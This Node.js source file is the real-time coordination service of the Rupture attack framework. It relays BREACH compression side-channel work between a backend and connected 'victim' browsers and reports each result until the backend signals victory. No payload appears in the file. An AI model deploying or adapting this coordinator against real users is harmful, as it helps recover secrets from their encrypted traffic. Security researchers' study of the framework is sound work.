const program = require('commander');

program
    .version('0.0.1')
    .option('-p, --port <port>', 'specify the websocket port to listen to [3031]', 3031)
    .option('-H, --backend-host <hostname>', 'specify the hostname of the HTTP backend service to connect to [localhost]', 'localhost')
    .option('-P, --backend-port <port>', 'specify the port of the HTTP backend service to connect to [8000]', 8000)
    .parse(process.argv);


const io = require('socket.io'),
      winston = require('winston'),
      http = require('http');

winston.level = 'debug';
winston.remove(winston.transports.Console);
winston.add(winston.transports.Console, {'timestamp': true});

const PORT = program.port;

winston.info('Rupture real-time service starting');
winston.info('Listening on port ' + PORT);

var socket = io.listen(PORT);
var victims = {};

const BACKEND_HOST = program.backendHost;
      BACKEND_PORT = program.backendPort;

winston.info('Backed by backend service running at ' + BACKEND_HOST + ':' + BACKEND_PORT);

socket.on('connection', (client) => {
    winston.info('New connection from client ' + client.id);

    var victimId;
    client.on('client-hello', (data) => {
        var victim_id;

        try {
            ({victim_id} = data);
        }
        catch (e) {
            winston.error('Got invalid client-hello message from client');
            return;
        }

        if (!victims.victim_id) {
            victimId = victim_id;
            client.emit('server-hello');
        }
        else {
            client.emit('server-nowork');
        }
    });

    var doNoWork = () => {
        client.emit('do-work', {});
    };

    var createNewWork = () => {
        var getWorkOptions = {
            host: BACKEND_HOST,
            port: BACKEND_PORT,
            path: '/breach/get_work/' + victimId
        };

        var getWorkRequest = http.request(getWorkOptions, (response) => {
            var responseData = '';
            response.on('data', (chunk) => {
                responseData += chunk;
            });
            response.on('end', () => {
                try {
                    client.emit('do-work', JSON.parse(responseData));
                    winston.info('Got (get-work) response from backend: ' + responseData);
                }
                catch (e) {
                    winston.error('Got invalid (get-work) response from backend');
                    doNoWork();
                }
            });
        });
        getWorkRequest.on('error', (err) => {
            winston.error('Caught getWorkRequest error: ' + err);
            doNoWork();
        });
        getWorkRequest.end();
    };

    var reportWorkCompleted = (work) => {
        var requestBodyString = JSON.stringify(work);

        var workCompletedOptions = {
            host: BACKEND_HOST,
            port: BACKEND_PORT,
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': requestBodyString.length
            },
            path: '/breach/work_completed/' + victimId,
            method: 'POST',
        };

        var workCompletedRequest = http.request(workCompletedOptions, (response) => {
            var responseData = '';
            response.on('data', (chunk) => {
                responseData += chunk;
            });
            response.on('end', () => {
                try {
                    var victory = JSON.parse(responseData).victory;

                    winston.info('Got (work-completed) response from backend: ' + responseData);

                    if (victory === false) {
                        createNewWork();
                    }
                }
                catch (e) {
                    winston.error('Got invalid (work-completed) response from backend');
                    doNoWork();
                }
            });
        });
        workCompletedRequest.on('error', (err) => {
            winston.error('Caught workCompletedRequest error: ' + err);
            doNoWork();
        });
        workCompletedRequest.write(requestBodyString);
        workCompletedRequest.end();
    };

    client.on('get-work', () => {
        winston.info('get-work from client ' + client.id);
        victims.victimId = client.id;
        createNewWork();
    });

    client.on('work-completed', (data) => {
        var work, success, host;

        try {
            ({work, success, host} = data);
        }
        catch (e) {
            winston.error('Got invalid work-completed from client');
            return;
        }

        winston.info('Client indicates work completed: ', work, success, host);

        var requestBody = work;
        requestBody.success = success;
        reportWorkCompleted(requestBody);
    });
    client.on('disconnect', () => {
        winston.info('Client ' + client.id + ' disconnected');

        for (var i in victims) {
            if (victims.i == client.id) {
                victims.i = null;
            }
        }

        var requestBody = {
            success: false
        };
        reportWorkCompleted(requestBody);
    });
});
